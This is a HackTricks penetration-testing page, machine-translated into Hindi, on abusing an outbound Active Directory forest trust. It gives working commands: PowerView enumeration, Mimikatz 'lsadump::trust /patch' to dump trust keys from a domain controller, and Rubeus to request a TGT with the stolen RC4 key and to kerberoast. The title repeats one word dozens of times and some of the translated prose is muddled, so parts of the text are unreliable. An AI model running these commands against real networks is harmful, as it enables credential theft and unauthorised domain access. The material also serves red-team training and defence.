# बाहरी वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन व
```powershell
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
## विश्वास खाता हमला

जब एक एक्टिव डिरेक्टरी डोमेन या फ़ोरेस्ट ट्रस्ट एक डोमेन _B_ से डोमेन _A_ की स्थापना की जाती है (_**B**_ एक विश्वास करता है A), एक विश्वास खाता डोमेन **A** में बनाया जाता है, जिसका नाम है **B. Kerberos trust keys**,\_जो **विश्वास खाते के पासवर्ड** से प्राप्त होते हैं, इंटर-रील्म TGTs को **एन्क्रिप्ट करने** के लिए उपयोग किए जाते हैं, जब डोमेन A के उपयोगकर्ता डोमेन B में सेवा टिकट के लिए अनुरोध करते हैं।

यह संभव है कि डोमेन कंट्रोलर से विश्वसनीय खाते का पासवर्ड और हैश प्राप्त किया जाए, इसके लिए:
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
जो खतरा है वह भरोसा खाता B$ के सक्षम होने के कारण है, **B$ का प्राथमिक समूह डोमेन A के डोमेन उपयोगकर्ताओं है**, डोमेन उपयोगकर्ताओं को प्रदान की गई कोई भी अनुमति B$ के लिए लागू होती है और B$ के क्रेडेंशियल का उपयोग करके डोमेन A के खिलाफ प्रमाणीकरण करना संभव है।

{% hint style="warning" %}
इसलिए, विश्वास करने वाले डोमेन से विश्वसनीय डोमेन के भीतर एक उपयोगकर्ता प्राप्त करना संभव है। इस उपयोगकर्ता के पास बहुत सारी अनुमतियाँ नहीं होंगी (संभवतः केवल डोमेन उपयोगकर्ताओं की) लेकिन आपको **बाहरी डोमेन की जांच करने की क्षमता होगी**।
{% endhint %}

इस उदाहरण में विश्वास करने वाला डोमेन `ext.local` है और विश्वसनीय डोमेन `root.local` है। इसलिए, `root.local` के भीतर एक उपयोगकर्ता `EXT$` नामक बनाया जाता है।
```bash
# Use mimikatz to dump trusted keys
lsadump::trust /patch
# You can see in the output the old and current credentials
# You will find clear text, AES and RC4 hashes
```
इसलिए, इस बिंदु पर **`root.local\EXT$`** के **सद्य वर्णमाला पासवर्ड और Kerberos गुप्त कुंजी** हैं। **`root.local\EXT$`** के Kerberos AES गुप्त कुंजी AES विश्वास कुंजी के समान हैं क्योंकि एक अलग साल्ट का उपयोग किया जाता है, लेकिन **RC4 कुंजी एक ही हैं**। इसलिए, हम **ext.local** से डंप किए गए RC4 विश्वास कुंजी का उपयोग कर सकते हैं `root.local` के खिलाफ `root.local\EXT$` के रूप में **प्रमाणित** होने के लिए।
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
इसके साथ आप उस डोमेन की गणना शुरू कर सकते हैं और उपयोगकर्ताओं को kerberoasting भी कर सकते हैं:
```
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### साफ़ टेक्स्ट विश्वास पासवर्ड इकट्ठा करना

पिछले फ़्लो में **साफ़ टेक्स्ट पासवर्ड** की जगह पर विश्वास हैश का उपयोग किया गया था (जिसे मिमीकेट्स द्वारा भी डंप किया गया था)।

साफ़ टेक्स्ट पासवर्ड को मिमीकेट्स के \[ CLEAR ] आउटपुट को हेक्साडेसिमल में रूपांतरित करके और नल बाइट्स '\x00' को हटाकर प्राप्त किया जा सकता है:

![](<../../.gitbook/assets/image (2) (1) (2) (1).png>)

कभी-कभी जब विश्वास संबंध बनाया जाता है, तो उपयोगकर्ता द्वारा विश्वास के लिए एक पासवर्ड टाइप किया जाना चाहिए। इस प्रदर्शन में, कुंजी मूल विश्वास पासवर्ड है और इसलिए मानव पठनीय है। कुंजी के चक्र (30 दिन) के बाद, साफ़ टेक्स्ट मानव पठनीय नहीं होगा लेकिन तकनीकी रूप से अभी भी उपयोगी होगा।

साफ़ टेक्स्ट पासवर्ड का उपयोग करके विश्वास खाता के रूप में नियमित प्रमाणीकरण करने के लिए इस्तेमाल किया जा सकता है, जो विश्वास खाते की कर्बेरोस गुप्त कुंजी का उपयोग करके एक टीजीटी अनुरोध करने का एक विकल्प है। यहां, ext.local से root.local को Domain Admins के सदस्यों के लिए क्वेरी करना:

![](<../../.gitbook/assets/image (1) (1) (1) (2).png>)

## संदर्भ

* [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **हैकट्रिक्स में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS की नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने की उपलब्धता** चाहिए? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष [**NFT**](https://opensea.io/collection/the-peass-family) संग्रह।
* प्राप्त करें [**आधिकारिक PEASS और HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **ट्विटर** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **अपने हैकिंग ट्रिक्स साझा करें, हैकट्रिक्स रेपो में पीआर जमा करके** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **को डालकर।**

</details>
